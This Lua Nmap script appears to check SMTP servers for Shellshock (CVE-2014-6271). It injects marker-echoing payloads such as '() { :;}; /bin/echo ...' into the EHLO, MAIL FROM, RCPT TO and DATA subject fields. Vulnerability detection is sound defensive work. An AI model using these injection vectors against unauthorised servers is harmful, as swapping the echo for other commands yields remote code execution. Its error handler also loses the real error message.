local stdnse = require "stdnse"

description = [[Detects Shellshock in SMTP servers via crafted EHLO/MAIL FROM/RCPT TO headers (CVE-2014-6271).]]
author = "HackIT Framework"
license = "HackIT Framework — Internal Use Only"
categories = {"vuln", "safe"}

portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" and (port.service == "smtp" or port.number == 25 or port.number == 587 or port.number == 465) end

local smtp_commands = {
  {cmd = "EHLO", format = "EHLO %s\r\n"},
  {cmd = "HELO", format = "HELO %s\r\n"},
  {cmd = "MAIL FROM", format = "MAIL FROM:<%s@test.com>\r\n"},
  {cmd = "RCPT TO", format = "RCPT TO:<%s@localhost>\r\n"},
}

local shellshock_payloads = {
  "() { :;}; /bin/echo HackIT_SS_Test",
  "() { :;}; /usr/bin/printf 'HackIT_SS_Test\\n'",
  "() { :;}; /bin/bash -c 'echo HackIT_SS_Test_Marker'",
}

action = function(host, port)
  local ok, result = pcall(function()
    local findings = {}
    local banner_str = ""
    local smtp_version = nil

    local sock = nmap.new_socket()
    sock:set_timeout(10000)
    local status = sock:connect(host.ip, port.number)
    if not status then
      local result = stdnse.output_table()
      result.cve = "CVE-2014-6271 (Shellshock SMTP)"
      result.severity = "MEDIUM"
      result.vulnerable = false
      result.detail = "Connection failed"
      result.error = true
      return result
    end

    local banner, banner_err = sock:receive_buf("\n", 3)
    if not banner then sock:close()
      local result = stdnse.output_table()
      result.cve = "CVE-2014-6271"
      result.severity = "MEDIUM"
      result.vulnerable = false
      result.detail = "No SMTP banner"
      return result
    end

    banner_str = banner:gsub("\r?\n", ""):gsub("%s+$", "")
    smtp_version = banner_str:match("([%d%.]+)")
    local banner_check = banner_str:match("^220")

    if not banner_check then
      table.insert(findings, {check = "SMTP banner", detail = ("Unexpected banner format: %s"):format(banner_str), severity = "INFO"})
    else
      table.insert(findings, {check = "SMTP banner", detail = banner_str, severity = "INFO"})
    end

    for _, payload in ipairs(shellshock_payloads) do
      local test_sock = nmap.new_socket()
      test_sock:set_timeout(10000)
      local ok_sock = test_sock:connect(host.ip, port.number)
      if ok_sock then
        test_sock:receive_buf("\n", 3)

        for _, sc in ipairs(smtp_commands) do
          local cmd_data = sc.format:format(payload)
          test_sock:send(cmd_data)
          local rcv, rcv_err = test_sock:receive_buf("\n", 3)
          if rcv then
            if rcv:match("HackIT") or rcv:match("Shellshock") or rcv:match("Marker") then
              local excerpt = rcv:gsub("\r?\n", ""):gsub("%s+$", "")
              table.insert(findings, {
                check = ("Shellshock via %s"):format(sc.cmd),
                detail = ("Injection reflected in SMTP response: %s"):format(excerpt),
                severity = "CRITICAL",
                payload = payload:sub(1, 40),
              })
              break
            end
          end
        end

        local data_payload = ("DATA\r\nSubject: %s\r\n\r\nTest\r\n.\r\n"):format(payload)
        test_sock:send(data_payload)
        local rcv_data = test_sock:receive_buf("\n", 3)
        if rcv_data and (rcv_data:match("HackIT") or rcv_data:match("Shellshock")) then
          table.insert(findings, {
            check = "Shellshock via DATA subject",
            detail = ("Injection reflected in DATA response: %s"):format(rcv_data:gsub("\r?\n", "")),
            severity = "CRITICAL",
            payload = payload:sub(1, 40),
          })
        end

        test_sock:send("QUIT\r\n")
        test_sock:close()
      end
    end

    sock:close()

    if #findings > 0 then
      local result = stdnse.output_table()
      result.cve = "CVE-2014-6271 (Shellshock SMTP)"
      result.severity = "CRITICAL"
      result.vulnerable = true
      result.banner = banner_str
      result.version = smtp_version or "unknown"
      result.detail = ("SMTP Shellshock (CVE-2014-6271) confirmed via %d vector(s)"):format(#findings)
      for i, f in ipairs(findings) do
        result[("vector_%d"):format(i)] = ("[%s] %s: %s"):format(f.severity, f.check, f.detail)
      end
      return result
    end

    local result = stdnse.output_table()
    result.cve = "CVE-2014-6271"
    result.severity = "LOW"
    result.vulnerable = false
    result.banner = banner_str
    result.version = smtp_version or "unknown"
    result.detail = "No SMTP Shellshock detected"
    return result
  end)
  if not ok then
    local result = stdnse.output_table()
    result.cve = "CVE-2014-6271"
    result.severity = "MEDIUM"
    result.vulnerable = false
    result.detail = "Error during scan: " .. tostring(result)
    result.error = true
    return result
  end
  return result
end
